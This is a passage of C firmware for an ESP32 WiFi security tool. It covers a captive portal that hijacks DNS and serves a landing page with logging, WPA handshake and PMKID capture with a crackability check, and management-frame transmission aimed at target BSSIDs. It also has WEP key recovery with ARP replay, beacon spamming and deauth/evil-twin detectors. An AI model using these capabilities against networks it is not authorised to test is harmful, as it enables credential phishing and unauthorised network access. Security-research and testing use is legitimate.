    ESP_LOGI(TAG, "captive portal OFF (%u hits)", (unsigned)s_portal_hits);
}

static void do_portal_on(void)
{
    if (s_portal_active) {
        return;
    }
    if (nocsif_reliability_safe_mode()) {
        return;
    }
    if (!s_ap_active) {
        do_ap_on();                                     /* the portal rides on top of the open AP */
    }
    if (!s_ap_active) {
        ESP_LOGW(TAG, "portal: AP did not start");
        return;
    }
    portal_sel_ensure_loaded();

    s_portal_hits = 0;                                  /* a fresh session */
    s_portal_page = NULL;
    s_portal_page_len = 0;
    s_portal_page_tried = false;
    s_portal_logpath[0] = '\0';
    portENTER_CRITICAL(&s_portal_mux);
    s_portal_log_head = s_portal_log_cnt = 0;
    portEXIT_CRITICAL(&s_portal_mux);
    s_portal_gen++;

    s_portal_sd_ok = (nocsif_usb_gadget_claim_sd(1500) == ESP_OK);   /* the page and log, best-effort */

    s_dns_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s_dns_sock >= 0) {
        struct sockaddr_in sa = { 0 };
        sa.sin_family = AF_INET;
        sa.sin_port = htons(53);
        sa.sin_addr.s_addr = htonl(INADDR_ANY);
        if (bind(s_dns_sock, (struct sockaddr *)&sa, sizeof sa) != 0) {
            close(s_dns_sock); s_dns_sock = -1;
        }
    }
    if (s_dns_sock >= 0) {
        s_dns_run = true;
        if (xTaskCreateWithCaps(portal_dns_task, "wifidns", 4096, NULL, 4, &s_dns_task, MALLOC_CAP_SPIRAM) != pdPASS) {
            s_dns_run = false; close(s_dns_sock); s_dns_sock = -1; s_dns_task = NULL;
            ESP_LOGW(TAG, "portal: DNS task create failed");
        }
    }

    httpd_config_t hc = HTTPD_DEFAULT_CONFIG();
    hc.server_port      = 80;
    hc.stack_size       = 8192;                          /* FATFS page/log I/O runs on this task */
    hc.max_uri_handlers = 4;
    hc.lru_purge_enable = true;
    hc.uri_match_fn     = httpd_uri_match_wildcard;
    if (httpd_start(&s_httpd, &hc) == ESP_OK) {
        httpd_uri_t g = { .uri = "/*", .method = HTTP_GET,  .handler = portal_http_req };
        httpd_uri_t p = { .uri = "/*", .method = HTTP_POST, .handler = portal_http_req };
        httpd_register_uri_handler(s_httpd, &g);
        httpd_register_uri_handler(s_httpd, &p);
    } else {
        s_httpd = NULL;
        ESP_LOGE(TAG, "portal: httpd_start failed");
    }

    if (s_httpd == NULL) {                               /* HTTP is mandatory: roll the session back */
        portal_stop();
        publish_status("err");
        publish_detail("Portal failed to start.");
        return;
    }

    s_portal_active = true;
    ESP_LOGW(TAG, "captive portal ON (dns=%s http=80 sd=%s); int-dma free=%u",
             s_dns_task ? "up" : "off", s_portal_sd_ok ? "yes" : "no",
             (unsigned)nocsif_int_dma_free());
    refresh_strings();
}

static void do_portal_off(void)
{
    portal_stop();
    refresh_strings();
}

/* Re-serves a newly selected landing page on an already-running
 * portal: a clean stop then start on the worker, with the AP itself
 * staying up. A no-op if the portal isn't active — the new selection just
 * applies at the next Start. */
static void do_portal_reload(void)
{
    if (!s_portal_active) {
        return;
    }
    portal_stop();
    do_portal_on();
}

/* ---- monitor's published getters: RAM/volatile, safe on the LVGL task ---- */
bool     nocsif_wifi_monitor_active(void)    { return s_mon_active; }
bool     nocsif_wifi_monitor_hopping(void)   { return s_mon_hop; }
int      nocsif_wifi_monitor_channel(void)   { return s_mon_chan; }
uint32_t nocsif_wifi_monitor_total(void)     { return s_mon_total; }
uint32_t nocsif_wifi_monitor_rate(void)      { return s_mon_rate; }
int8_t   nocsif_wifi_monitor_rssi_last(void) { return s_mon_rssi_last; }
int8_t   nocsif_wifi_monitor_rssi_peak(void) { return s_mon_rssi_peak; }

uint32_t nocsif_wifi_monitor_count(nocsif_wifi_pkt_kind_t kind)
{
    if ((int)kind < 0 || kind >= NOCSIF_WIFI_PKT_KINDS) {
        return 0;
    }
    return s_mon_by_type[kind];
}

uint32_t nocsif_wifi_monitor_ch_count(int ch)
{
    if (ch < 1 || ch > 13) {
        return 0;
    }
    return s_mon_ch[ch];
}

const char *nocsif_wifi_monitor_tag_str(void)
{
    static char buf[16];
    if (!s_mon_active && !s_pending_monitor) {
        return "off";
    }
    if (s_mon_hop) {
        snprintf(buf, sizeof buf, "ch %d", s_mon_chan);
    } else {
        snprintf(buf, sizeof buf, "lock %d", s_mon_chan);
    }
    return buf;
}

/* ---- passive parser getters (M5-P3): snapshot copies, safe on the LVGL task ---- */
bool     nocsif_wifi_parse_active(void)  { return s_parse_active; }
int      nocsif_wifi_mon_ap_count(void)  { return s_mon_ap_cnt; }
uint32_t nocsif_wifi_mon_ap_gen(void)    { return s_mon_ap_gen; }

bool nocsif_wifi_mon_ap_get(int idx, nocsif_wifi_mon_ap_t *out)
{
    if (out == NULL) {
        return false;
    }
    mon_ap_t tmp;
    bool ok;
    portENTER_CRITICAL(&s_ap_mux);
    ok = (idx >= 0 && idx < s_mon_ap_cnt && s_mon_ap[idx].used);
    if (ok) {
        tmp = s_mon_ap[idx];                          /* a whole-struct copy under the lock */
    }
    portEXIT_CRITICAL(&s_ap_mux);
    if (!ok) {
        return false;
    }
    memcpy(out->bssid, tmp.bssid, 6);
    memcpy(out->ssid, tmp.ssid, sizeof out->ssid);
    out->channel  = tmp.channel;
    out->rssi     = tmp.rssi;
    out->security = tmp.sec;
    out->frames   = tmp.frames;
    memcpy(out->vendor, tmp.vendor, sizeof out->vendor);
    int64_t age = esp_timer_get_time() - tmp.last_us;
    out->age_ms = age > 0 ? (uint32_t)(age / 1000) : 0;
    return true;
}

const char *nocsif_wifi_sec_str(uint8_t sec)
{
    switch (sec) {
        case NOCSIF_WIFI_SEC_OPEN:  return "open";
        case NOCSIF_WIFI_SEC_WEP:   return "WEP";
        case NOCSIF_WIFI_SEC_WPA:   return "WPA";
        case NOCSIF_WIFI_SEC_WPA2:  return "WPA2";
        case NOCSIF_WIFI_SEC_WPA3:  return "WPA3";
        case NOCSIF_WIFI_SEC_WPA2E: return "WPA2-E";
        default:                    return "?";
    }
}

const char *nocsif_wifi_mon_ap_tag_str(void)
{
    static char buf[16];
    if (!s_parse_active) {
        return "off";
    }
    snprintf(buf, sizeof buf, "%d seen", s_mon_ap_cnt);
    return buf;
}

int nocsif_wifi_mon_ap_ie(const uint8_t bssid[6], uint8_t *out, int max)
{
    if (!bssid || !out || max <= 0 || s_mon_ap_ie == NULL) {
        return 0;
    }
    int n = 0;
    portENTER_CRITICAL(&s_ap_mux);
    for (int i = 0; i < s_mon_ap_cnt; i++) {
        if (s_mon_ap[i].used && memcmp(s_mon_ap[i].bssid, bssid, 6) == 0) {
            n = s_mon_ap_ie[i].len;
            if (n > max) n = max;
            memcpy(out, s_mon_ap_ie[i].data, (size_t)n);
            break;
        }
    }
    portEXIT_CRITICAL(&s_ap_mux);
    return n;
}

/* ---- omit list (persisted; MACs dropped at ingestion into the passive tables) ---------------- */
#define WIFI_OMIT_BUF_SZ (NOCSIF_WIFI_OMIT_MAX * 52)   /* text scratch, on-demand PSRAM */

/* Rebuild the persisted string from s_omit + commit it. LVGL task (sole writer) → reads unlocked.
 * Record text: "<12-hex mac> <name>\n". */
static void omit_save(void)
{
    char *buf = heap_caps_malloc(WIFI_OMIT_BUF_SZ, MALLOC_CAP_SPIRAM);
    if (buf == NULL) { ESP_LOGW(TAG, "omit_save: no scratch — list not persisted this time"); return; }
    int off = 0, n = s_omit_cnt;
    for (int i = 0; i < n && off < WIFI_OMIT_BUF_SZ - 60; i++) {
        const nocsif_wifi_omit_t *o = &s_omit[i];
        off += snprintf(buf + off, WIFI_OMIT_BUF_SZ - off, "%02x%02x%02x%02x%02x%02x %s\n",
                        o->mac[0], o->mac[1], o->mac[2], o->mac[3], o->mac[4], o->mac[5], o->name);
    }
    buf[off] = '\0';
    nocsif_settings_set_str("wifi_omit", buf);
    heap_caps_free(buf);
}

static void omit_load(void)
{
    if (s_omit_loaded) {
        return;
    }
    s_omit_loaded = true;
    char *buf = heap_caps_malloc(WIFI_OMIT_BUF_SZ, MALLOC_CAP_SPIRAM);
    if (buf == NULL) return;
    if (nocsif_settings_get_str("wifi_omit", buf, WIFI_OMIT_BUF_SZ, "") != ESP_OK || !buf[0]) {
        heap_caps_free(buf);
        return;
    }
    int cnt = 0;
    char *p = buf;
    while (*p && cnt < NOCSIF_WIFI_OMIT_MAX) {
        char *nl = strchr(p, '\n');
        if (nl) *nl = '\0';
        size_t len = strlen(p);
        if (len >= 12) {                             /* 12 hex mac (MSB-first) */
            uint8_t m[6]; unsigned by; bool ok = true;
            for (int i = 0; i < 6; i++) {
                if (sscanf(p + i * 2, "%2x", &by) != 1) { ok = false; break; }
                m[i] = (uint8_t)by;
            }
            if (ok) {
                nocsif_wifi_omit_t *o = &s_omit[cnt];
                memcpy(o->mac, m, 6);
                const char *nm = (len >= 14) ? p + 13 : "";   /* [12]=' ', name at [13..] */
                snprintf(o->name, sizeof o->name, "%s", nm);
                cnt++;
            }
        }
        if (!nl) break;
        p = nl + 1;
    }
    s_omit_cnt = cnt;
    heap_caps_free(buf);
}

bool nocsif_wifi_omit_contains(const uint8_t mac[6])
{
    if (!mac || !s_omit_loaded) {
        return false;
    }
    bool hit = false;
    portENTER_CRITICAL(&s_omit_mux);
    for (int i = 0; i < s_omit_cnt; i++) {
        if (memcmp(s_omit[i].mac, mac, 6) == 0) { hit = true; break; }
    }
    portEXIT_CRITICAL(&s_omit_mux);
    return hit;
}

/* Drop any live AP/station/probe entry for `mac` so an omit takes effect at once. Under s_ap_mux. */
static void omit_purge_tables(const uint8_t mac[6])
{
    portENTER_CRITICAL(&s_ap_mux);
    for (int i = 0; i < s_mon_ap_cnt; i++)
        if (s_mon_ap[i].used && memcmp(s_mon_ap[i].bssid, mac, 6) == 0) {
            s_mon_ap[i].used = false; s_mon_ap[i].last_us = 0;
            if (s_mon_ap_ie) s_mon_ap_ie[i].len = 0;
            s_mon_ap_gen++;
        }
    for (int i = 0; i < s_mon_sta_cnt; i++)
        if (s_mon_sta[i].used && memcmp(s_mon_sta[i].mac, mac, 6) == 0) {
            s_mon_sta[i].used = false; s_mon_sta[i].last_us = 0; s_mon_sta_gen++;
        }
    for (int i = 0; i < s_mon_probe_cnt; i++)
        if (s_mon_probe[i].used && memcmp(s_mon_probe[i].mac, mac, 6) == 0) {
            s_mon_probe[i].used = false; s_mon_probe[i].last_us = 0; s_mon_probe_gen++;
        }
    portEXIT_CRITICAL(&s_ap_mux);
}

void nocsif_wifi_omit_add(const uint8_t mac[6], const char *name)
{
    if (!mac) {
        return;
    }
    omit_load();
    bool added = false;
    portENTER_CRITICAL(&s_omit_mux);
    int found = -1;
    for (int i = 0; i < s_omit_cnt; i++)
        if (memcmp(s_omit[i].mac, mac, 6) == 0) { found = i; break; }
    if (found < 0 && s_omit_cnt < NOCSIF_WIFI_OMIT_MAX) {
        nocsif_wifi_omit_t *o = &s_omit[s_omit_cnt++];
        memcpy(o->mac, mac, 6);
        snprintf(o->name, sizeof o->name, "%s", (name && name[0]) ? name : "");
        added = true;
    }
    portEXIT_CRITICAL(&s_omit_mux);
    if (!added) {
        return;
    }
    omit_purge_tables(mac);
    omit_save();
}

void nocsif_wifi_omit_remove(const uint8_t mac[6])
{
    if (!mac) {
        return;
    }
    omit_load();
    bool removed = false;
    portENTER_CRITICAL(&s_omit_mux);
    for (int i = 0; i < s_omit_cnt; i++) {
        if (memcmp(s_omit[i].mac, mac, 6) == 0) {
            for (int j = i; j < s_omit_cnt - 1; j++) s_omit[j] = s_omit[j + 1];
            s_omit_cnt--;
            removed = true;
            break;
        }
    }
    portEXIT_CRITICAL(&s_omit_mux);
    if (removed) omit_save();
}

void nocsif_wifi_omit_clear(void)
{
    omit_load();
    portENTER_CRITICAL(&s_omit_mux);
    s_omit_cnt = 0;
    portEXIT_CRITICAL(&s_omit_mux);
    omit_save();
}

int nocsif_wifi_omit_count(void)
{
    return s_omit_loaded ? s_omit_cnt : 0;
}

bool nocsif_wifi_omit_get(int i, nocsif_wifi_omit_t *out)
{
    if (!out || !s_omit_loaded) {
        return false;
    }
    bool ok;
    portENTER_CRITICAL(&s_omit_mux);
    ok = (i >= 0 && i < s_omit_cnt);
    if (ok) *out = s_omit[i];
    portEXIT_CRITICAL(&s_omit_mux);
    return ok;
}

/* ---- station list getters (M5-P3·2; snapshot copies, LVGL-task-safe) ---------------- */
int      nocsif_wifi_mon_sta_count(void) { return s_mon_sta_cnt; }
uint32_t nocsif_wifi_mon_sta_gen(void)   { return s_mon_sta_gen; }

bool nocsif_wifi_mon_sta_get(int idx, nocsif_wifi_mon_sta_t *out)
{
    if (out == NULL) {
        return false;
    }
    mon_sta_t tmp;
    char ssid[WIFI_SSID_MAX]; ssid[0] = '\0';
    bool ok;
    portENTER_CRITICAL(&s_ap_mux);
    ok = (idx >= 0 && idx < s_mon_sta_cnt && s_mon_sta[idx].used);
    if (ok) {
        tmp = s_mon_sta[idx];                         /* a whole-struct copy under the lock */
        for (int i = 0; i < s_mon_ap_cnt; i++) {      /* resolves the AP's SSID by its BSSID */
            if (s_mon_ap[i].used && memcmp(s_mon_ap[i].bssid, tmp.bssid, 6) == 0) {
                memcpy(ssid, s_mon_ap[i].ssid, sizeof ssid);
                break;
            }
        }
    }
    portEXIT_CRITICAL(&s_ap_mux);
    if (!ok) {
        return false;
    }
    memcpy(out->mac, tmp.mac, 6);
    memcpy(out->bssid, tmp.bssid, 6);
    memcpy(out->ssid, ssid, sizeof out->ssid);
    out->channel = tmp.channel;
    out->rssi    = tmp.rssi;
    out->frames  = tmp.frames;
    memcpy(out->vendor, tmp.vendor, sizeof out->vendor);
    int64_t age = esp_timer_get_time() - tmp.last_us;
    out->age_ms = age > 0 ? (uint32_t)(age / 1000) : 0;
    return true;
}

const char *nocsif_wifi_mon_sta_tag_str(void)
{
    static char buf[16];
    if (!s_parse_active) {
        return "off";
    }
    snprintf(buf, sizeof buf, "%d seen", s_mon_sta_cnt);
    return buf;
}

/* ---- probe-request getters (M5-P3.2): snapshot copies, safe on the LVGL task ---- */
int      nocsif_wifi_mon_probe_count(void) { return s_mon_probe_cnt; }
uint32_t nocsif_wifi_mon_probe_gen(void)   { return s_mon_probe_gen; }

bool nocsif_wifi_mon_probe_get(int idx, nocsif_wifi_mon_probe_t *out)
{
    if (out == NULL) {
        return false;
    }
    mon_probe_t tmp;
    bool ok;
    portENTER_CRITICAL(&s_ap_mux);
    ok = (idx >= 0 && idx < s_mon_probe_cnt && s_mon_probe[idx].used);
    if (ok) {
        tmp = s_mon_probe[idx];
    }
    portEXIT_CRITICAL(&s_ap_mux);
    if (!ok) {
        return false;
    }
    memcpy(out->mac, tmp.mac, 6);
    memcpy(out->ssid, tmp.ssid, sizeof out->ssid);
    out->rssi  = tmp.rssi;
    out->count = tmp.count;
    memcpy(out->vendor, tmp.vendor, sizeof out->vendor);
    out->channel = tmp.channel;
    int64_t age = esp_timer_get_time() - tmp.last_us;
    out->age_ms = age > 0 ? (uint32_t)(age / 1000) : 0;
    return true;
}

const char *nocsif_wifi_mon_probe_tag_str(void)
{
    static char buf[16];
    if (!s_parse_active) {
        return "off";
    }
    snprintf(buf, sizeof buf, "%d seen", s_mon_probe_cnt);
    return buf;
}

/* ---- key-exchange getters (M5-P4.1): snapshot copies, safe on the LVGL task ---- */
int      nocsif_wifi_mon_hs_count(void) { return s_mon_hs_cnt; }
uint32_t nocsif_wifi_mon_hs_gen(void)   { return s_mon_hs_gen; }

bool nocsif_wifi_mon_hs_get(int idx, nocsif_wifi_mon_hs_t *out)
{
    if (out == NULL) {
        return false;
    }
    mon_hs_t tmp;
    char ssid[WIFI_SSID_MAX]; ssid[0] = '\0';
    bool ok;
    portENTER_CRITICAL(&s_ap_mux);
    ok = (idx >= 0 && idx < s_mon_hs_cnt && s_mon_hs[idx].used);
    if (ok) {
        tmp = s_mon_hs[idx];                          /* a whole-struct copy under the lock */
        for (int i = 0; i < s_mon_ap_cnt; i++) {      /* resolves the AP's SSID by its BSSID */
            if (s_mon_ap[i].used && memcmp(s_mon_ap[i].bssid, tmp.bssid, 6) == 0) {
                memcpy(ssid, s_mon_ap[i].ssid, sizeof ssid);
                break;
            }
        }
    }
    portEXIT_CRITICAL(&s_ap_mux);
    if (!ok) {
        return false;
    }
    memcpy(out->bssid, tmp.bssid, 6);
    memcpy(out->ssid, ssid, sizeof out->ssid);
    out->msg_mask  = tmp.msg_mask;
    out->has_pmkid = tmp.has_pmkid;
    memcpy(out->pmkid, tmp.pmkid, sizeof out->pmkid);
    out->rssi   = tmp.rssi;
    out->frames = tmp.frames;
    memcpy(out->vendor, tmp.vendor, sizeof out->vendor);
    int64_t age = esp_timer_get_time() - tmp.last_us;
    out->age_ms = age > 0 ? (uint32_t)(age / 1000) : 0;
    return true;
}

const char *nocsif_wifi_mon_hs_tag_str(void)
{
    static char buf[16];
    if (!s_parse_active) {
        return "off";
    }
    snprintf(buf, sizeof buf, "%d seen", s_mon_hs_cnt);
    return buf;
}

bool nocsif_wifi_hs_crackable(const nocsif_wifi_mon_hs_t *hs)
{
    if (hs == NULL) {
        return false;
    }
    if (hs->has_pmkid) {
        return true;                                  /* a PMKID alone is already enough */
    }
    return (hs->msg_mask & 0x03) == 0x03;             /* message 1 plus message 2: the pair the offline check needs */
}

/* ---- anomaly detectors (M5-P4.2): RAM/volatile plus an AP-table snapshot, safe on the LVGL task ---- */
uint32_t nocsif_wifi_deauth_count(void)     { return s_mon_deauth; }
uint32_t nocsif_wifi_disassoc_count(void)   { return s_mon_disassoc; }
uint32_t nocsif_wifi_deauth_rate(void)      { return s_mon_dd_rate; }
uint32_t nocsif_wifi_deauth_peak_rate(void) { return s_mon_dd_peak; }

const char *nocsif_wifi_anomaly_tag_str(void)
{
    static char buf[16];
    if (!s_mon_active) {
        return "off";
    }
    if (s_mon_dd_rate > 0) {
        snprintf(buf, sizeof buf, "%u/s", (unsigned)s_mon_dd_rate);   /* the live deauth/disassoc rate */
        return buf;
    }
    return "ok";
}

int nocsif_wifi_mon_dup_snapshot(nocsif_wifi_mon_dup_t *arr, int max)
{
    if (arr == NULL || max < 0) {
        return 0;
    }
    /* Copies (SSID, security) pairs out of the AP table under the lock,
     * then groups them outside the lock, so the short spinlock is never held
     * across the O(n^2) comparison. Each AP entry is a distinct BSSID (the
     * table is keyed by BSSID), so counting entries with the same SSID is
     * counting the distinct BSSIDs advertising it. */
    struct { char ssid[WIFI_SSID_MAX]; uint8_t sec; } snap[MON_AP_MAX];
    int cnt = 0;
    portENTER_CRITICAL(&s_ap_mux);
    for (int i = 0; i < s_mon_ap_cnt && cnt < MON_AP_MAX; i++) {
        if (s_mon_ap[i].used && s_mon_ap[i].ssid[0]) {
            memcpy(snap[cnt].ssid, s_mon_ap[i].ssid, WIFI_SSID_MAX);
            snap[cnt].sec = s_mon_ap[i].sec;
            cnt++;
        }
    }
    portEXIT_CRITICAL(&s_ap_mux);

    bool done[MON_AP_MAX] = { false };
    int groups = 0;
    for (int i = 0; i < cnt; i++) {
        if (done[i]) continue;
        int     n   = 1;
        uint8_t lo  = snap[i].sec, hi = snap[i].sec;
        bool    open = (snap[i].sec == NOCSIF_WIFI_SEC_OPEN);
        done[i] = true;
        for (int j = i + 1; j < cnt; j++) {
            if (done[j]) continue;
            if (strcmp(snap[j].ssid, snap[i].ssid) == 0) {
                done[j] = true;
                n++;
                if (snap[j].sec < lo) lo = snap[j].sec;
                if (snap[j].sec > hi) hi = snap[j].sec;
                if (snap[j].sec == NOCSIF_WIFI_SEC_OPEN) open = true;
            }
        }
        if (n >= 2) {                                  /* an SSID seen on 2 or more BSSIDs: report the group */
            if (groups < max) {
                nocsif_wifi_mon_dup_t *d = &arr[groups];
                snprintf(d->ssid, sizeof d->ssid, "%s", snap[i].ssid);
                d->bssids       = (uint8_t)(n > 255 ? 255 : n);
                d->sec_mismatch = (lo != hi);
                d->has_open     = open;
                d->sec_lo       = lo;
                d->sec_hi       = hi;
            }
            groups++;
        }
    }
    return groups;
}

/* ---- PCAP getters (M5-P3.3): RAM/volatile, safe on the LVGL task ---- */
bool     nocsif_wifi_pcap_active(void)  { return s_pcap_active; }
uint32_t nocsif_wifi_pcap_frames(void)  { return s_pcap_frames; }
uint32_t nocsif_wifi_pcap_bytes(void)   { return s_pcap_bytes; }
uint32_t nocsif_wifi_pcap_dropped(void) { return s_pcap_drop; }
const char *nocsif_wifi_pcap_path(void) { return s_pcap_path; }

bool nocsif_wifi_pcap_stream_active(void) { return s_pcap_want && s_pcap_sink == PCAP_SINK_CDC; }

const char *nocsif_wifi_pcap_status_str(void)
{
    switch (s_pcap_state) {
        case PCAP_REC:       return "rec";
        case PCAP_NOSD:      return "no card";
        case PCAP_FILESHARE: return "file share";
        case PCAP_ERR:       return "err";
        case PCAP_STREAM:    return "stream";
        case PCAP_NOHOST:    return "no host";
        default:             return "off";
    }
}

const char *nocsif_wifi_pcap_tag_str(void)
{
    return nocsif_wifi_pcap_status_str();
}

static void wifi_task(void *arg)
{
    (void)arg;
    wifi_cmd_t c;
    for (;;) {
        const bool got = xQueueReceive(s_q, &c, pdMS_TO_TICKS(s_lh_pending ? 100 : 1000)) == pdTRUE;
        link_health_tick();                  /* at least once a second: the station link check */
        if (!got) {
            continue;
        }
        switch (c.type) {
        case CMD_ENABLE:     do_enable();  break;
        case CMD_DISABLE:    do_disable(); break;
        case CMD_SCAN:       do_scan();    break;
        case CMD_SCAN_DONE:  do_scan_done(); break;
        case CMD_CONNECT:    do_connect(c.ssid, c.pass); break;
        case CMD_DISCONNECT: do_disconnect(); break;
        case CMD_FORGET:     do_forget(); break;
        case CMD_RECONNECT:  do_reconnect(); break;
        case CMD_RANDMAC:    do_randmac(); break;
        case CMD_RESTMAC:    do_restmac(); break;
        case CMD_APPLY_HOST: do_apply_host(); break;
        case CMD_CONNECT_SAVED: do_connect_saved(c.ssid); break;
        case CMD_FORGET_SSID:   do_forget_ssid(c.ssid); break;
        case CMD_SETMAC:        apply_mac(c.mac); break;
        case CMD_MONITOR_ON:    do_monitor_on(); break;
        case CMD_MONITOR_OFF:   do_monitor_off(); break;
        case CMD_MON_HOP:       do_mon_hop(c.arg != 0); break;
        case CMD_MON_CHAN:      do_mon_chan((int)c.arg); break;
        case CMD_PARSE_ON:      do_parse_on(); break;
        case CMD_PARSE_OFF:     do_parse_off(); break;
        case CMD_PCAP_ON:       if (!s_pcap_want) { s_pcap_filter = PCAP_FILTER_FULL; do_pcap_on(); } break;
        case CMD_PCAP_OFF:      do_pcap_off(); break;
        case CMD_PCAP_STREAM_ON:  do_pcap_stream_on();  break;
        case CMD_PCAP_STREAM_OFF: do_pcap_stream_off(); break;
        case CMD_HS_ON:         do_hs_capture_on(); break;
        case CMD_HS_OFF:        do_pcap_off(); break;   /* stops the shared writer */
        case CMD_MGMTTX_ON:     do_mgmt_tx_on(); break;
        case CMD_MGMTTX_OFF:    do_mgmt_tx_off(); break;
        case CMD_MGMTTX_TARGET: do_mgmt_tx_target(c.mac, (int)c.arg, c.ssid); break;
        case CMD_WEP_ON:        do_wep_on(c.mac, (int)c.arg, (int)c.arg2, c.ssid); break;
        case CMD_WEP_OFF:       do_wep_off(); do_monitor_off(); break;   /* stop + restore the STA link */
        case CMD_BEACON_ON:     do_beacon_on(); break;
        case CMD_BEACON_OFF:    do_beacon_off(); break;
        case CMD_EXPORT_HC:     do_export_hc(); break;
        /* §4.8a: the software AP + portal are mutually exclusive with the companion surface (which owns
         * port 80) — fully cycle companion off first, then clear its SSID override. */
        case CMD_AP_ON:         if (s_comp_active) companion_stop(); do_ap_on(); break;   /* one radio + one :80 */
        case CMD_AP_OFF:        do_ap_off(); break;
        case CMD_PORTAL_ON:     if (s_comp_active) companion_stop(); do_portal_on(); break;
        case CMD_PORTAL_OFF:    do_portal_off(); break;
        case CMD_PORTAL_RELOAD: do_portal_reload(); break;
        case CMD_COMP_REMOTE_ON:  do_comp_remote_on();  break;   /* Travel Router "Control": surface on the gateway AP */
        case CMD_COMP_REMOTE_OFF: do_comp_remote_off(); break;
        case CMD_LEAN_ON:       do_lean_set(true);  break;
        case CMD_LEAN_OFF:      do_lean_set(false); break;
        case CMD_GEO_STAMP:     do_geo_stamp(c.arg, c.arg2); break;   /* §4.6 P3 */
        case CMD_GOT_IP:        do_got_ip(&c.ip); break;             /* off the sys_evt stack */
        case CMD_LINK_LOST:     do_link_lost((uint8_t)c.arg); break; /* off the sys_evt stack */
        case CMD_REJOIN:
            if (s_connected && s_want_connect) {
                ESP_LOGW(TAG, "re-join of \"%s\" requested", s_ssid);
                s_retry = 0;
                esp_wifi_disconnect();          /* s_want_connect stays set: do_link_lost re-connects */
            } else {
                do_reconnect();
            }
            break;
        }
    }
}

/* ---- public API ---- */
static void post(wifi_cmd_type_t type, const char *ssid, const char *pass)
{
    if (s_q == NULL) {
        return;
    }
    wifi_cmd_t c = { .type = type };
    if (ssid) { snprintf(c.ssid, sizeof c.ssid, "%s", ssid); }
    if (pass) { snprintf(c.pass, sizeof c.pass, "%s", pass); }
    xQueueSend(s_q, &c, 0);     /* non-blocking; a full queue just drops the request, and the UI retries */
}

void nocsif_wifi_request_geo_stamp(int32_t lat_ud, int32_t lon_ud)
{
    if (s_q == NULL) {
        return;
    }
    wifi_cmd_t c = { .type = CMD_GEO_STAMP, .arg = lat_ud, .arg2 = lon_ud };
    xQueueSend(s_q, &c, 0);     /* non-blocking; a dropped stamp gets re-offered on the next fresh fix */
}

static void post_mac(const uint8_t mac[6])
{
    if (s_q == NULL) {
        return;
    }
    wifi_cmd_t c = { .type = CMD_SETMAC };
    memcpy(c.mac, mac, 6);
    xQueueSend(s_q, &c, 0);
}

/* Posts the management-frame TX target: BSSID in `mac`, channel in `arg`, SSID in `ssid`. */
static void post_target(const uint8_t bssid[6], int channel, const char *ssid)
{
    if (s_q == NULL) {
        return;
    }
    wifi_cmd_t c = { .type = CMD_MGMTTX_TARGET, .arg = channel };
    memcpy(c.mac, bssid, 6);
    if (ssid) { snprintf(c.ssid, sizeof c.ssid, "%s", ssid); }
    xQueueSend(s_q, &c, 0);
}

static void post_i(wifi_cmd_type_t type, int32_t arg)
{
    if (s_q == NULL) {
        return;
    }
    wifi_cmd_t c = { .type = type, .arg = arg };
    xQueueSend(s_q, &c, 0);
}

/* ---- #4 WEP key recovery public API ------------------------------------------------- */
void nocsif_wifi_request_wep_recover(const uint8_t bssid[6], int channel, int key_len,
                                     const char *ssid, bool on)
{
    if (!on) { post(CMD_WEP_OFF, NULL, NULL); return; }
    if (s_q == NULL || bssid == NULL) return;
    wifi_cmd_t c = { .type = CMD_WEP_ON, .arg = channel, .arg2 = key_len };
    memcpy(c.mac, bssid, 6);
    if (ssid) snprintf(c.ssid, sizeof c.ssid, "%s", ssid);
    xQueueSend(s_q, &c, 0);
}

void nocsif_wifi_wep_set_replay(bool on)
{
    s_wep_replay = on;
    if (s_wep_replay_timer) {
        esp_timer_stop(s_wep_replay_timer);                 /* harmless if not running */
        if (on && s_wep_active) esp_timer_start_periodic(s_wep_replay_timer, 5000);
    }
}
bool     nocsif_wifi_wep_replay(void)      { return s_wep_replay; }
nocsif_wep_state_t nocsif_wifi_wep_state(void) { return (nocsif_wep_state_t)s_wep_state; }
uint32_t nocsif_wifi_wep_unique_ivs(void)  { return s_wep_unique; }
uint8_t  nocsif_wifi_wep_progress(void)    { return s_wep_progress; }
uint32_t nocsif_wifi_wep_data_frames(void) { return s_wep_data_frames; }
uint32_t nocsif_wifi_wep_replays(void)     { return s_wep_replays; }
bool     nocsif_wifi_wep_has_arp(void)     { return s_wep_arp_len > 0; }

int nocsif_wifi_wep_key(uint8_t *out, int max)
{
    int n = s_wep_key_bytes;
    if (n <= 0 || !out) return 0;
    if (n > max) n = max;
    memcpy(out, s_wep_key, (size_t)n);
    return n;
}
const char *nocsif_wifi_wep_key_hex(void)   { return s_wep_key_hex; }
const char *nocsif_wifi_wep_key_ascii(void) { return s_wep_key_ascii; }

const char *nocsif_wifi_wep_status_str(void)
{
    static char b[56];
    switch ((nocsif_wep_state_t)s_wep_state) {
        case NOCSIF_WEP_RECOVERED:
            snprintf(b, sizeof b, "recovered %d-bit key", s_wep_key_bytes * 8);
            break;
        case NOCSIF_WEP_COLLECTING:
            snprintf(b, sizeof b, "collecting %u IVs (%u%%)%s",
                     (unsigned)s_wep_unique, (unsigned)s_wep_progress,
                     (s_wep_replay && s_wep_arp_len > 0) ? " · replay" : "");
            break;
        case NOCSIF_WEP_FAILED: snprintf(b, sizeof b, "could not start"); break;
        default:                snprintf(b, sizeof b, "idle"); break;
    }
    return b;
}
const char *nocsif_wifi_wep_target_str(void)
{
    static char b[64];
    snprintf(b, sizeof b, "%s · %02x:%02x:%02x:%02x:%02x:%02x",
             s_wep_ssid[0] ? s_wep_ssid : "(hidden)",
             s_wep_bssid[0], s_wep_bssid[1], s_wep_bssid[2], s_wep_bssid[3], s_wep_bssid[4], s_wep_bssid[5]);
    return b;
}
const char *nocsif_wifi_wep_tag_str(void)
{
    static char b[16];
    if (s_wep_state == NOCSIF_WEP_RECOVERED) return "got key";
    if (!s_wep_active) return "off";
    snprintf(b, sizeof b, "%u IVs", (unsigned)s_wep_unique);
    return b;
}

esp_err_t nocsif_wifi_init(void)
{
    if (s_task != NULL) {
        return ESP_OK;          /* safe to call more than once */
    }
    if (nocsif_reliability_safe_mode()) {
        publish_status("off");
        publish_detail("WiFi disabled (safe mode).");
        ESP_LOGW(TAG, "safe mode — WiFi bring-up skipped");
        return ESP_OK;          /* no task exists, so nocsif_wifi_available() stays false */
    }

    load_creds();               /* prime the RAM cache before any getter runs */
    load_saved();               /* prime the saved-profile list (migrates the legacy slot) */
    ap_cfg_ensure_loaded();     /* prime the software-AP config (SSID/channel/hidden) */
